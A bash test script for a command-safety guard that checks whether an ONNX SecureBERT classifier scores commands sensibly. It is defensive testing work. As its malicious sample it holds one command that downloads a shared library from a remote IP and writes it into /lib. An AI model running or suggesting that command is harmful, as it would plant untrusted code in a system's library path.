#!/usr/bin/env bash
# Tier-2 ONNX: SecureBERT 2.0 (or any HF-tokenizer ONNX classifier).
# Requires model + tokenizer files. Skips cleanly if absent so this
# scenario is safe to include in `quick` runs.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

MODEL_DIR="${ATTY_ONNX_MODEL_DIR:-$HOME/.cache/atty/onnx-securebert2}"
MODEL_PATH="$MODEL_DIR/model.onnx"
TOKENIZER_PATH="$MODEL_DIR/tokenizer.json"

if [ ! -f "$MODEL_PATH" ] || [ ! -f "$TOKENIZER_PATH" ]; then
    skip "ONNX model not found at $MODEL_DIR (set ATTY_ONNX_MODEL_DIR or download SecureBERT 2.0)"
    exit 0
fi

# Write a TOML config that points the daemon at the model files.
CONFIG_FILE=$(mktemp -t atty-guard-onnx.XXXXXX.toml)
trap 'rm -f "$CONFIG_FILE"' EXIT

cat > "$CONFIG_FILE" <<TOML
[tier2.onnx]
model = "securebert2"
model_path = "$MODEL_PATH"
tokenizer_path = "$TOKENIZER_PATH"
TOML

start_guard --tier2 onnx --config "$CONFIG_FILE"

# Known-malicious-shaped command: the SLM should rate it above the
# warn threshold. Use a payload that ISN'T caught by Tier-1 so the
# verdict is genuinely SLM-driven.
classify "wget -q http://10.0.0.1/x.so -O /lib/x.so && echo done"
got_verdict=$(_jq verdict)
got_confidence=$(_jq confidence)
# Don't require a specific verdict — model calibration varies — but
# the SLM should at LEAST emit a non-zero confidence (>0) and not
# Safe with confidence 0.
if [ "$got_verdict" = "safe" ]; then
    python3 -c "import sys; sys.exit(0 if float('$got_confidence') > 0.0 else 1)" || \
        fail "SLM returned Safe with confidence 0 — model is probably not loaded"
fi

# Known-benign: must be Safe at high confidence (low risk score).
classify "ls -la"
expect_verdict safe

pass "Tier-2 ONNX backend produces non-trivial verdicts"
